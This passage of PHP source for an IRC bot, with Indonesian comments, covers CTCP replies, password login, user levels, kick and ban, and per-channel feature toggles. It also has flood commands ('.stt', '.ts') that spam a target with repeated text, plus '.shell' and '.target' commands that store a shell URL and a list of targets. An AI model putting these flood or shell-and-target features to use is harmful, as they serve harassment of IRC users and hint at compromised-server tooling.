                                $modbot->change_nickchan($fsrc[nick],"");
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$modbot->logoutbot($fsrc[nick]);}
                                break;
                            case "NOTICE":
                                if($Params[3]==':PING'){

                                   $modbot->stuf_lag($fp,$fsrc[nick],$Params[4]); 
                                }
                                if($Params[3]==':VERSION'){
                                    if($datversi[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,8);
                                        $modbot->msg($fp,$datversi[strtolower($fsrc[nick])]["chan"],'12[7Version12] 7'.$fsrc[nick].' '.$vernya);
                                    }
                                    unset($datversi[strtolower($fsrc[nick])]["nick"]);unset($datversi[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':FINGER'){
                                    if($datfinger[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,7);
                                        $modbot->msg($fp,$datfinger[strtolower($fsrc[nick])]["chan"],'15(04Info15) 7'.$fsrc[nick].' '.$vernya);
                                    }
                                    unset($datfinger[strtolower($fsrc[nick])]["nick"]);unset($datfinger[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':TIME'){
                                    if($dattime[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$timenya=str_replace(chr(1),"",$dText);$timenya=substr($timenya,5);
                                        $modbot->msg($fp,$dattime[strtolower($fsrc[nick])]["chan"],'15(04Info15) 7'.$fsrc[nick].' '.$timenya);
                                    }
                                    unset($dattime[strtolower($fsrc[nick])]["nick"]);unset($dattime[strtolower($fsrc[nick])]["chan"]);
                                }
                                break;
                            case "PRIVMSG":
                                $TxtMsg=substr($DataLine,strpos($DataLine," :")+2);
                                unset($dCom);$dCom=explode(" ", $TxtMsg);$perintah=strtolower($dCom[0]);
                                if($haltfl['on']==0){
                                if ( $Params[3]==":PING") {$modbot->notice($fp,$fsrc[nick],$TxtMsg);}
                                elseif ($Params[3]==":VERSION") { $ctcpversi=$versbot[rand(0,count($versbot) - 1)];$modbot->notice($fp,$fsrc[nick],chr(1) . 'VERSION '. $ctcpversi . chr(1));}
                                elseif ($Params[3]==":FINGER") { $modbot->notice($fp,$fsrc[nick],chr(1) . 'FINGER '. $ctcpfinger . chr(1));}
                                elseif ($Params[3]==":TIME") { $timetoday = date("D M j H:i:s Y"); $modbot->notice($fp,$fsrc[nick],chr(1) . 'TIME '.$timetoday . chr(1));}
                                }
                                ################ ANTI SLAPS ############
                                if($Params[3]==':ACTION' && ereg('#',$Params[2]) && $systembot['SLAPS'][strtoupper($Params[2])]=="3ON"){
                                    if(strpos(strtolower($TxtMsg),"slaps") || strpos(strtolower($TxtMsg),"slap")){
                                        foreach ($auth as $ulist) {if($ulist["name"]){if(strpos(strtolower($TxtMsg),strtolower($ulist["name"]))){$onbos=1;}}}
                                        if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$onbos=0;}
                                        if($onbos==1){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapbos());}
                                        elseif($onbos==0){if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->msg($fp,$Params[2],$modbot->rnd_slapampun());}}
                                        else{if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapme());}}
                                        $onbos=2;
                                    }
                                }
                                ############ END ANTI SLAPS ############
                                if (substr($Params[3],0,2)==':^'){
                                    $logok=$modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host]);
                                    if (strtolower($dCom[0])=='^login' && $dCom[1]) {
                                        if($logok==1){$modbot->notice($fp,$fsrc[nick],"You`re Already Authorized!");}
                                        else{
                                            if($haltfl['on']!=0){sleep(2);};
                                            if($modbot->loginbot($fsrc[nick],$fsrc[user],$fsrc[host],$dCom[1])==1){
                                                $modbot->notice($fp,$fsrc[nick],'You`re Authorized As '.$auth["$fsrc[nkecil]"]["status"].'!');
                                                $modbot->notice($fp,$fsrc[nick],'For help type .help');
                                                $auth["$fsrc[nkecil]"]["ident"]=$fsrc[user];$auth["$fsrc[nkecil]"]["host"]=$fsrc[host];
                                                if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                            }
                                        }
                                   }
                                   elseif (strtolower($dCom[0])=='^logout' && $logok==1) {
                                    if($modbot->logoutbot($fsrc[nick])==1){$modbot->notice($fp,$fsrc[nick],'You`re LogOut!');}
                                   }
                                }
                                elseif (substr($Params[3],0,2)==':.'){
                                    if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])){
                                        if (ereg('#',$Params[2])){$cmdin=1;$target=$Params[2];}else {$cmdin=2;$target=$fsrc[nick];}
                                        $getlvl=$modbot->level_user($fsrc[nick]);
                                        if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                        ############### MULTI USER BOT ##############
                                        if ($perintah=='.chgpass' && $dCom[1] && $dCom[2]) {
                                            $modbot->chgpass_user($fp,$fsrc[nick],$dCom[1],$dCom[2]);
                                        }
                                        elseif ($perintah=='.adduser' && $dCom[1] && $dCom[1]!=$bot['nick'] && $dCom[2] && $dCom[3] && $getlvl > 1) {
                                            $modbot->add_user($fp,$fsrc[nick],$dCom[1],$dCom[2],$dCom[3]);
                                        }
                                        elseif ($perintah=='.deluser' && $dCom[1] && $getlvl > 1) {
                                            $modbot->del_user($fp,$fsrc[nick],$dCom[1]);
                                        }
                                        ############# END MULTI USER BOT ############
                                        
                                        ########## CHANGE SERVER IDENT REALNAME SERVPASS && JUMP ########
                                        elseif ($perintah=='.server' && $dCom[1] && $getlvl > 2){
                                            $bot['server']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.servpass' && $dCom[1] && $getlvl > 2){
                                            $bot['pserver']=$dCom[1];$bot['userver']=1;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging PassWOrD SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.ident' && $dCom[1] && $getlvl > 2){
                                            $bot['ident']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging IdentD To '. $dCom[1]);
                                        }

                                        elseif ($perintah=='.vhost' && $dCom[1] && $getlvl > 2){
                                            $bot['local']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging VhosT To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.realname' && $dCom[1] && $getlvl > 2){
                                            $Rmsg=substr($TxtMsg,10);$Rmsg=ltrim($Rmsg);$bot['realname']=$Rmsg;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging ReaLNaMe To '. $Rmsg);
                                        }
                                        elseif ($perintah=='.jump' && $getlvl > 2){
                                            $keluar = 0;$modbot->quit($fp,$modbot->rnd_logo() .' ReSTaRt bY '.$fsrc[nick]);
                                        }
                                        ########################## END CHG SER IDENT REAL ##########################
                                        
                                        ################################ #### ##################################
                                        elseif ($perintah=='.botnick' && $getlvl > 1) {
                                                $modbot->notice($fp,$fsrc[nick],'My Nick Is :'.$bot['nick']);
                                        }
                                        elseif ($perintah=='.identnick' && $dCom[1] && $dCom[2] && $cmdin==2 && $getlvl > 1){
                                                $bot['inick']=$dCom[1];$bot['pnick'] = $dCom[2];
                                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);
                                                $modbot->notice($fp,$fsrc[nick],"Identify nick... to ".$dCom[1]);
                                        }
                                        elseif ($perintah=='.logoutnick' && $getlvl > 1){
                                                $modbot->msg($fp,"Nickserv","logout");$modbot->notice($fp,$fsrc[nick],"Logout nick");
                                        }
                                        elseif ($perintah=='.basechan' && $dCom[1] && $getlvl > 2){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['basechan'],$modbot->rnd_logo() . ' BaseChan cHanGE by ' . $frsc[nick]);
                                                $bot['basechan']=$bchan;$modbot->join($fp,$bot['basechan']);
                                        }
                                        elseif ($perintah=='.botchan' && $dCom[1] && $dCom[2] && $getlvl > 3){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['roomnet']);$bot['roomnet']=$bchan;
                                                $bot['roomkey']=$dCom[2];$modbot->join($fp,$bot['roomnet'],$bot['roomkey']);
                                        }
                                        elseif ($perintah=='.userlist' && $getlvl > 1) {
                                            $modbot->notice($fp,$fsrc[nick],'User List: '.$modbot->user_list($fp,$fsrc[nick]));
                                        }
                                        elseif ($perintah=='.chanlist' && $getlvl > 2) {
                                            $datachan=str_replace(";"," ",$modbot->show_chan());$modbot->notice($fp,$fsrc[nick],$datachan);$datachan="";unset($datachan);
                                        }
                                        elseif ($perintah=='.nicklist' && $dCom[1] && $getlvl > 2) {
                                            $nchan=$dCom[1];if (!ereg("#",$dCom[1])) { $nchan="#".$dCom[1]; }
                                            $datanick=explode(" ",$modbot->show_nickchan($nchan));
                                            for ($i = 0; $i <= count($datanick); $i++) {
                                                $limitshow++;$lnick_x=$lnick_x.' '.$datanick[$i];
                                                if($limitshow==15){
                                                    $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);$modbot->notice($fp,$fsrc[nick],$lnick_x);
                                                    $limitshow=0;$lnick_x="";
                                                }
                                            }
                                            $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);
                                            if($lnick_x){$modbot->notice($fp,$fsrc[nick],$lnick_x);}$lnick_x="";
                                            unset($lnick_x);unset($datanick);
                                        }
                                        elseif ($perintah=='.showison' && $getlvl > 2) {$modbot->notice($fp,$fsrc[nick],$modbot->show_ison());}
                                        elseif ($perintah=='.chanison' && $getlvl > 2) {$chanson=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChanIson cHanGe To '.$dCom[1]);}
                                        elseif ($perintah=='.settimercycle' && $dCom[1] && $getlvl > 2) {
                                                $timercy=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer aUtO Cycle cHanGe To '.$dCom[1].' Second');
                                        }
                                        elseif ($perintah=='.settimermsg' && $dCom[1] && $getlvl > 2) {
                                                $timermsg=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoMsg cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif ($perintah=='.settimeract' && $dCom[1] && $getlvl > 2) {
                                                $timeract=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoAction cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif($perintah=='.setversion' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpversi=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'VerSIoN cHanGe To '.$ctcpversi);
                                        }
                                        elseif($perintah=='.setfinger' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpfinger=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'FiNGeR cHanGe To '.$ctcpfinger);
                                        }
                                        ################################ #### ##################################
                                        
                                        
                                        ######################### CONTROL BOT #######################
                                        elseif ($perintah=='.up' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->msg($fp,"Chanserv",'Op '.$Params[2].' '.$bot['nick']);
                                        }
                                            elseif ($perintah=='.down' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->mode($fp,"+v-ho",$Params[2],$bot['nick'].' '.$bot['nick'].' '.$bot['nick']);
                                            }
                                            elseif ($perintah=='.o' || $perintah=='.h' || $perintah=='.v' || $perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                if ($getlvl > 1){
                                                    if ($perintah=='.o' || $perintah=='.h' || $perintah=='.v'){
                                                        $moden=strtolower(substr($dCom[0],1));$moden='+'.$moden . $moden . $moden;
                                                    }
                                                    elseif ($perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                        $moden=strtolower(substr($dCom[0],2));$moden='-'.$moden . $moden . $moden;
                                                    }
                                                    if ($cmdin==1){$ttarget=$Params[2];$tforce=$dCom[1];$tmore=$dCom[2].' '.$dCom[3];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tforce=$dCom[2];$tmore=$dCom[3].' '.$dCom[4];}
                                                    if ($tforce) { $vonick = $tforce; }else { $vonick = $fsrc[nick]; }
                                                    $modbot->mode($fp,$moden,$ttarget,$vonick.' '.$tmore);
                                                }
                                            }
                                            elseif ($perintah=='.k' || $perintah=='.kb' || $perintah=='.kc') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$tdata=$dCom[1];$ttarget=$Params[2];$tkode=$dCom[0].' '.$dCom[1];}
                                                    elseif($cmdin==2){$tdata=$dCom[2];$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1].' '.$dCom[2];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1); $msg=ltrim($msg);$msg=rtrim($msg);
                                                    if($perintah=='.k'){
                                                        $modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kb'){
                                                        $modbot->ban($fp,$ttarget,$tdata);$modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kc'){$modbot->kickserv($fp,$ttarget,$tdata,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.b' || $perintah=='.ub') {
                                                if($getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $tmode=substr($TxtMsg,strlen($tkode)+1);
                                                    $tmode=ltrim($tmode);$tmode=rtrim($tmode);
                                                    if($perintah=='.b'){$modbot->ban($fp,$ttarget,$tmode);}
                                                    else{$modbot->unban($fp,$ttarget,$tmode);}
                                                }
                                            }
                                            elseif ($perintah=='.j' && $dCom[1]) {
                                                $jchan=$dCom[1];if (!ereg("#",$dCom[1])) { $jchan="#".$dCom[1]; }
                                                $modbot->join($fp,$jchan,$dCom[2]);
                                            }
                                            elseif ($perintah=='.max' && $dCom[1]) {
                                                $maxkar=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Maximal karakter sekarang '.$maxkar.'!!!');
                                            }
                                            elseif ($perintah=='.flodban' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$floddban="OFF";}
                                                if(strtolower($dCom[1])=='on'){$floddban="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'flodban skarang '.$floddban.'!!!');
                                            }
                                            elseif ($perintah=='.target') {
                                                $ngulange=0;
                                                do {
                                                  $ngulange=$ngulange+1;
                                                  $modbot->msg($fp,$fsrc[nick],$hasiltargetgue[$ngulange]);sleep(1);
                                                  if($ngulange>=$notarget){$modbot->notice($fp,$fsrc[nick],'Wes entek boss!!');break;   }
                                                } while(true);  
                                            }
                                            elseif ($perintah=='.shell' && $dCom[1]) {
                                                $shellgue=$dCom[1]."?";
                                                $modbot->notice($fp,$fsrc[nick],'Shell skarang '.$shellgue.'?');
                                            }
                                            elseif ($perintah=='.repp' && $dCom[1]) {
                                                $makre=$dCom[1];
                                                $Maxreep=$dCom[1]-1;
                                                $modbot->notice($fp,$fsrc[nick],'Maximal Repeat sekarang '.$makre.'!!!');
                                            }
                                            elseif ($perintah=='.p' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,3+strlen($dCom[1])+1);
                                                $modbot->part($fp,$pchan,$pmsg);
                                            }
                                            elseif ($perintah=='.cy' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,4+strlen($dCom[1])+1);
                                                $modbot->Cycle($fp,$pchan,$pmsg);
                                            }
                                            elseif ($perintah=='.a' || $perintah=='.s') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.a'){$modbot->act($fp,$ttarget,$msg);
                                                    }else{$modbot->msg($fp,$ttarget,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.stm' || $perintah=='.stt') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.stm'){$modbot->msg($fp,$dCom[1],$msg);
                                                    }else{
                                                    $msg="[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[]";
                                                    $modbot->msg($fp,$dCom[1],$msg);
                                                    }
                                                }
                                            }
                                            elseif ($perintah=='.away'){
                                                if($dCom[1]){$modbot->away($fp,substr($TxtMsg,6));}else{$modbot->noaway($fp);}
                                            }
                                            elseif ($perintah=='.n' && $dCom[1]){$modbot->nick($fp,$dCom[1]);}
                                            elseif ($perintah=='.q' && $getlvl > 3 ){
                                            $keluar=1;if($dCom[1]){$Qmsg=substr($TxtMsg,3);}$modbot->quit($fp,$Qmsg);$keluar=1;sleep(3);exit;
                                            }
                                            
                                            elseif ($perintah=='.ts' && $dCom[1] && $getlvl > 2){
                                                $modbot->flood($fp,$dCom[1],$TxtMsg);
                                            }
                                            elseif($perintah=='.help'){
                                                $modbot->mod_help($fp,$fsrc[nick]);
                                            }
                                            ###################### END CONTROL BOT #####################
                                            
                                            ################################ SYSTEM ###################################
                                            elseif ($perintah=='.status' && $getlvl > 2 && $cmdin==1 ){
                                                if($dCom[1]){$chan=$dCom[1];}

                                                else{$chan=$Params[2];}
                                                if (!ereg("#",$chan)){$chan="#".$chan;}
                                                $chan=strtoupper($chan);
                                                $modb="";
                                                if($systembot['TIME'][$chan]=="3ON"){$modb.=' [4T]iME';}
                                                if($systembot['ASTRO'][$chan]=="3ON"){$modb.=' [4A]sTRo';}
                                                if($systembot['PING'][$chan]=="3ON"){$modb.=' [4P]iNG';}
                                                if($systembot['BOM'][$chan]=="3ON"){$modb.=' [4B]oM';}
                                                if($systembot['WHOIS'][$chan]=="3ON"){$modb.=' [4W]OIS';}
                                                if($systembot['GUARD'][$chan]=="3ON"){$modb.=' [4G]uaRd';}
                                                if($systembot['GVOICE'][$chan]=="3ON"){$modb.=' [4G]Voice';}
                                                if($systembot['JVERSION'][$chan]=="3ON"){$modb.=' [4J]Version';}
                                                if($systembot['SEEN'][$chan]=="3ON"){$modb.=' [4S]een';}
                                                if($systembot['JAM'][$chan]=="3ON"){$modb.=' [4J]am';}
                                                if($systembot['SCANSPY'][$chan]=="3ON"){$modb.=' [4S]py';}
                                                if($systembot['BADWORD'][$chan]=="3ON"){$modb.=' [4B]adword';}
                                                if($systembot['WARNAH'][$chan]=="3ON"){$modb.=' [4W]ana';}
                                                if($systembot['NGOMONG'][$chan]=="3ON"){$modb.=' [4C]rewet';}
                                                if($systembot['SPOOF'][$chan]=="3ON"){$modb.=' SPoo[4F]';}
                                                if($systembot['KSLANG'][$chan]=="3ON"){$modb.=' [4K]SlaNG';}
                                                if($systembot['IP'][$chan]=="3ON"){$modb.=' [4I]p lIsT';}
                                                if($systembot['VERSION'][$chan]=="3ON"){$modb.=' V[4E]rSIoN';}
                                                if($systembot['FINGER'][$chan]=="3ON"){$modb.=' [4F]iNGeR';}
                                                if($systembot['ISON']['ALL']=="3ON"){$modb.=' [4I]soN';}
                                                if($systembot['GREET'][$chan]=="3ON"){$modb.=' [4G]rEEt';}
                                                if($systembot['AUTOAWAY']['ALL']=="3ON"){$modb.=' AUtoA[4W]ay';}
                                                if($systembot['AUTOCYCLE'][$chan]=="3ON"){$modb.=' AuTO[4C]YcLE';}
                                                if($systembot['AUTOJOIN'][$chan]=="3ON"){$modb.=' AuTo[4J]oIN';}
                                                $modb=ltrim($modb);
                                                $modb=rtrim($modb);
                                                if($modb==""){$modb="[4PA]RKiR [4NI]c[4K]";}
                                                $modbot->act($fp,$Params[2],'iS MODeS '.$modb.' FoR [2'.strtoupper($chan).']');
                                            }
                                        elseif (substr($perintah,0,2)=='.+' || substr($perintah,0,2)=='.-'){
                                            if(substr($perintah,1,1)=='+'){$onoff="3ON";}elseif(substr($perintah,1,1)=='-'){$onoff="4OFF";};
                                            $wsys=substr(strtoupper($perintah),2);
                                            if($cmdin==1){$targetsys=$Params[2];if($dCom[1]){$targetsys=$dCom[1];}$sysok=1;}
                                            elseif($cmdin==2 && $dCom[1]){$targetsys=$dCom[1];$sysok=1;}
                                            if (!ereg("#",$targetsys)){$targetsys="#".$targetsys;}
                                            if($wsys=='PING' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'PING '. strtoupper($targetsys).' is [4'.strtoupper($systembot['PING'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='WHOIS' && $sysok==1 && $getlvl > 2){
                                                $systembot['WHOIS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'WHOIS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['WHOIS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ALL' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'PING '. strtoupper($targetsys).' is [4'.strtoupper($systembot['PING'][strtoupper($targetsys)]).']');
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOCYCLE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOCYCLE'][strtoupper($targetsys)]).']');
                                                $systembot['WHOIS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'WHOIS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['WHOIS'][strtoupper($targetsys)]).']');
                                                $systembot['GUARD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GUARD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GUARD'][strtoupper($targetsys)]).']');
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOJOIN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOJOIN'][strtoupper($targetsys)]).']');
                                                $systembot['JVERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JVERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JVERSION'][strtoupper($targetsys)]).']');
                                                $systembot['BOM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BOM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BOM'][strtoupper($targetsys)]).']');
                                                $systembot['GVOICE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GVOICE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GVOICE'][strtoupper($targetsys)]).']');
                                                $systembot['SEEN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SEEN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SEEN'][strtoupper($targetsys)]).']');
                                                $systembot['BADWORD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BADWORD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BADWORD'][strtoupper($targetsys)]).']');
                                                $systembot['WARNAH'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'WARNAH '. strtoupper($targetsys).' is [4'.strtoupper($systembot['WARNAH'][strtoupper($targetsys)]).']');
                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'VERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['VERSION'][strtoupper($targetsys)]).']');
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GREET '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GREET'][strtoupper($targetsys)]).']');
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'DNS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['DNS'][strtoupper($targetsys)]).']');
                                                $systembot['NGOMONG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'NGOMONG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['NGOMONG'][strtoupper($targetsys)]).']');
                                                $maxkar=200;$floddban="ON";$Maxreep=2;
                                            }
                                            if($wsys=='GUARD' && $sysok==1 && $getlvl > 2){
                                                $systembot['GUARD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GUARD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GUARD'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JVERSION' && $sysok==1 && $getlvl > 2){
                                                $systembot['JVERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JVERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JVERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GVOICE' && $sysok==1 && $getlvl > 2){
                                                $systembot['GVOICE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GVOICE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GVOICE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SEEN' && $sysok==1 && $getlvl > 2){

                                                $systembot['SEEN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SEEN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SEEN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SCANSPY' && $sysok==1 && $getlvl > 2){
                                                $systembot['SCANSPY'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SCANSPY '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SCANSPY'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JAM' && $sysok==1 && $getlvl > 2){
                                                $systembot['JAM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JAM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JAM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BADWORD' && $sysok==1 && $getlvl > 2){
                                                $systembot['BADWORD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BADWORD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BADWORD'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='WARNAH' && $sysok==1 && $getlvl > 2){
                                                $systembot['WARNAH'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'WARNAH '. strtoupper($targetsys).' is [4'.strtoupper($systembot['WARNAH'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='NGOMONG' && $sysok==1 && $getlvl > 2){
                                                $systembot['NGOMONG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'NGOMONG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['NGOMONG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='VERSION' && $sysok==1 && $getlvl > 2){
                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'VERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['VERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='TIME' && $sysok==1 && $getlvl > 2){
                                                $systembot['TIME'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'TIME '. strtoupper($targetsys).' is [4'.strtoupper($systembot['TIME'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='IP' && $sysok==1 && $getlvl > 2){
                                                $systembot['IP'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'IP '. strtoupper($targetsys).' is [4'.strtoupper($systembot['IP'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='FINGER' && $sysok==1 && $getlvl > 2){
                                                $systembot['FINGER'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'FINGER '. strtoupper($targetsys).' is [4'.strtoupper($systembot['FINGER'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ISON' && $sysok==1 && $getlvl > 2){
